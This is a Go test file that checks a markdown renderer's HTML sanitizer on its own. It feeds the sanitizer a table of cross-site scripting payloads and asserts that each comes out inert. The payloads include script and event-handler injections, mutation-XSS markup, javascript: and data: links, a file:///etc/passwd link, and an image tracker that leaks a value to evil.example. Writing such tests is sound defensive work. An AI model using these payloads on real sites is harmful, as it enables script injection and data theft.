package render

import (
	"slices"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"golang.org/x/net/html"
	"golang.org/x/net/html/atom"
)

// parts parses a fragment the way a browser does inside a div, and returns its
// elements and its text. Like the tests of the whole pipeline, the tests below
// look at structure: escaped text is harmless, an element or a handler never is.
func parts(t *testing.T, fragment string) (elements []*html.Node, text string) {
	t.Helper()
	nodes, err := html.ParseFragment(strings.NewReader(fragment), &html.Node{
		Type: html.ElementNode, Data: "div", DataAtom: atom.Div,
	})
	require.NoError(t, err)

	var sb strings.Builder
	var visit func(*html.Node)
	visit = func(n *html.Node) {
		switch n.Type {
		case html.ElementNode:
			elements = append(elements, n)
		case html.TextNode:
			sb.WriteString(n.Data)
		}
		for c := n.FirstChild; c != nil; c = c.NextSibling {
			visit(c)
		}
	}
	for _, n := range nodes {
		visit(n)
	}
	return elements, sb.String()
}

func withTag(elements []*html.Node, tag string) []*html.Node {
	return slices.DeleteFunc(slices.Clone(elements), func(n *html.Node) bool { return n.Data != tag })
}

func attrOf(n *html.Node, key string) string {
	for _, a := range n.Attr {
		if a.Key == key {
			return a.Val
		}
	}
	return ""
}

// The two layers are independent only if each one holds without the other. The
// tests of the whole pipeline cannot show that of the second: the converter
// turns raw HTML into text and every image into a link before the sanitizer
// sees anything, so a sanitizer that let all of it through would pass them. Here
// the sanitizer that Render uses gets hostile HTML itself, as if the converter
// had let it by.
func TestPolicy_StandsAloneWithoutTheConverter(t *testing.T) {
	policy := NewMarkdown().policy
	sanitize := func(src string) string { return string(policy.SanitizeBytes([]byte(src))) }

	t.Run("hostile HTML comes out inert", func(t *testing.T) {
		forbidden := []string{
			"script", "iframe", "style", "img", "svg", "math", "object", "embed", "form", "input",
			"button", "link", "meta", "base", "video", "audio", "source", "frame", "frameset", "template",
		}
		inputs := map[string]string{
			"script element":        `<script>alert(1)</script>`,
			"script in a paragraph": `<p>hello <script>alert(1)</script> world</p>`,
			"image with onerror":    `<img src="x" onerror="alert(1)">`,
			"image tracker":         `<img src="https://evil.example/pixel.png?leak=secret">`,
			"svg onload":            `<svg onload="alert(1)"><circle/></svg>`,
			"iframe":                `<iframe src="https://evil.example"></iframe>`,
			"iframe srcdoc":         `<iframe srcdoc="<script>alert(1)</script>"></iframe>`,
			"style block":           `<style>body{display:none}</style>`,
			"inline style":          `<p style="position:fixed;inset:0">cover the page</p>`,
			"inline style in cell":  `<table><tr><td style="background:url(https://evil.example/x)">x</td></tr></table>`,
			"anchor with handlers":  `<a href="https://example.com" onclick="alert(2)" onmouseover="alert(3)">x</a>`,
			"details ontoggle":      `<details open ontoggle="alert(1)"><summary>s</summary></details>`,
			"form":                  `<form action="https://evil.example"><input name="q"><button>Go</button></form>`,
			"object and embed":      `<object data="x.swf"></object><embed src="x.swf">`,
			"meta refresh":          `<meta http-equiv="refresh" content="0;url=https://evil.example">`,
			"base href":             `<base href="https://evil.example/">`,
			"math":                  `<math><mtext><script>alert(1)</script></mtext></math>`,
			"html comment":          `<!-- <script>alert(1)</script> -->`,
			"cdata":                 `<![CDATA[<script>alert(1)</script>]]>`,
			"null byte":             "<scr\x00ipt>alert(1)</scr\x00ipt>",
			// Markup that a browser may read differently the second time.
			"noscript":           `<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>`,
			"svg around a style": `<svg><style><img src=x onerror=alert(1)></style></svg>`,
			"form, math, mglyph": `<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>`,
			// The page's own code-block markup, with values the page did not write.
			"class with markup":      `<span class="k onmouseover=alert(1)">x</span>`,
			"class in capitals":      `<div class="Code Block">x</div>`,
			"language label to quit": `<div class="code-block" data-lang="go&quot;&gt;&lt;script&gt;">x</div>`,
		}
		for name, src := range inputs {
			t.Run(name, func(t *testing.T) {
				elements, _ := parts(t, sanitize(src))

				for _, n := range elements {
					assert.NotContains(t, forbidden, n.Data, "forbidden <%s> in output", n.Data)
					for _, a := range n.Attr {
						assert.False(t, strings.HasPrefix(strings.ToLower(a.Key), "on"), "event handler %s on <%s>", a.Key, n.Data)
						assert.NotEqual(t, "style", a.Key, "inline style on <%s>", n.Data)
						assert.NotEqual(t, "srcdoc", a.Key)
					}
					if n.Data == "a" {
						assert.Regexp(t, `^(https?://|mailto:)`, strings.ToLower(attrOf(n, "href")), "unsafe link target")
					}
					if class := attrOf(n, "class"); class != "" {
						assert.Regexp(t, `^[a-z][a-z0-9 _-]*$`, class, "a class that is not a plain word")
					}
					if lang := attrOf(n, "data-lang"); lang != "" {
						assert.Regexp(t, `^[a-z0-9+#._-]{1,30}$`, lang, "a language label that is not a plain word")
					}
				}
			})
		}
	})

	// A link that is not absolute would be followed on our own origin, with the
	// reader's session. What is not a link stays on the page as its words.
	t.Run("only an absolute web or mail link stays a link", func(t *testing.T) {
		hrefs := map[string]string{
			"javascript":               `javascript:alert(1)`,
			"mixed case scheme":        `JaVaScRiPt:alert(1)`,
			"entity-obfuscated scheme": `&#106;avascript:alert(1)`,
			"tab inside the scheme":    `java&#9;script:alert(1)`,
			"vbscript":                 `vbscript:msgbox(1)`,
			"data URL":                 `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`,
			"file":                     `file:///etc/passwd`,
			"page of ours":             `/logout`,
			"protocol-relative":        `//evil.example/x`,
			"fragment":                 `#frag`,
			"relative path":            `relative/path`,
			"query only":               `?x=1`,
			"dot-dot path":             `../../c/other`,
			"backslash path":           `\\evil.example\x`,
		}
		for name, href := range hrefs {
			t.Run(name, func(t *testing.T) {
				elements, text := parts(t, sanitize(`<a href="`+href+`">the words</a>`))

				assert.Empty(t, withTag(elements, "a"), "no link")
				assert.Equal(t, "the words", text, "the words stay")
			})
		}
	})

	// Without this the two tests above would pass for a sanitizer that deletes
	// everything.
	t.Run("the markup the page needs gets through", func(t *testing.T) {
		tests := []struct {
			name  string
			src   string
			check func(t *testing.T, elements []*html.Node)
		}{
			{"text formatting", `<p>a <strong>b</strong> <em>c</em> <del>d</del></p>`, func(t *testing.T, e []*html.Node) {
				for _, tag := range []string{"p", "strong", "em", "del"} {
					assert.Len(t, withTag(e, tag), 1, tag)
				}
			}},
			{"a web link opens safely in a new tab", `<a href="https://example.com/a?b=1&amp;c=2">docs</a>`, func(t *testing.T, e []*html.Node) {
				a := withTag(e, "a")
				require.Len(t, a, 1)
				assert.Equal(t, "https://example.com/a?b=1&c=2", attrOf(a[0], "href"))
				assert.Equal(t, "_blank", attrOf(a[0], "target"))
				for _, token := range []string{"noopener", "noreferrer", "nofollow"} {
					assert.Contains(t, attrOf(a[0], "rel"), token)
				}
			}},
			{"a mail link", `<a href="mailto:a@example.com">mail</a>`, func(t *testing.T, e []*html.Node) {
				a := withTag(e, "a")
				require.Len(t, a, 1)
				assert.Equal(t, "mailto:a@example.com", attrOf(a[0], "href"))
			}},
			{"table alignment", `<table><thead><tr><th align="left">A</th></tr></thead><tbody><tr><td align="right">1</td></tr></tbody></table>`, func(t *testing.T, e []*html.Node) {
				require.Len(t, withTag(e, "th"), 1)
				require.Len(t, withTag(e, "td"), 1)
				assert.Equal(t, "left", attrOf(withTag(e, "th")[0], "align"))
				assert.Equal(t, "right", attrOf(withTag(e, "td")[0], "align"))
			}},
			{"numbering that starts elsewhere", `<ol start="3"><li>c</li></ol>`, func(t *testing.T, e []*html.Node) {
				require.Len(t, withTag(e, "ol"), 1)
				assert.Equal(t, "3", attrOf(withTag(e, "ol")[0], "start"))
			}},
			{"highlighted code keeps its classes and its label", `<div class="code-block" data-lang="go"><pre class="chroma"><code><span class="k">func</span></code></pre></div>`, func(t *testing.T, e []*html.Node) {
				require.Len(t, withTag(e, "div"), 1)
				require.Len(t, withTag(e, "pre"), 1)
				require.Len(t, withTag(e, "span"), 1)
				assert.Equal(t, "code-block", attrOf(withTag(e, "div")[0], "class"))
				assert.Equal(t, "go", attrOf(withTag(e, "div")[0], "data-lang"))
				assert.Equal(t, "chroma", attrOf(withTag(e, "pre")[0], "class"))
				assert.Equal(t, "k", attrOf(withTag(e, "span")[0], "class"))
			}},
		}
		for _, tc := range tests {
			t.Run(tc.name, func(t *testing.T) {
				elements, _ := parts(t, sanitize(tc.src))

				tc.check(t, elements)
			})
		}
	})
}
